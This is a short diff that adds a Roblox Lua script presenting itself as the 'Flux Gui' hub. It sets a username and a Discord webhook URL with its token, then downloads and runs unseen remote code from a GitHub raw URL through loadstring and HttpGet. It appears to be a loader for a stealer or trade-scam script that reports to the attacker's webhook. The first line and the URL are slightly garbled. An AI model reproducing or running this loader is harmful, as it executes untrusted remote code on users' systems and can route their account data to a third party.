@@ -1,0 +1,5 @@
+G.Username = "UN62879106"
+_G.HubName = "Flux Gui"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095534201664700416/1govadpUW9_Fm-6-B37IdjJjwQhwLuWLHMW2hThIgCuxdEnX69NLdJk6U2P_6QBZOF0i"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua%22))()
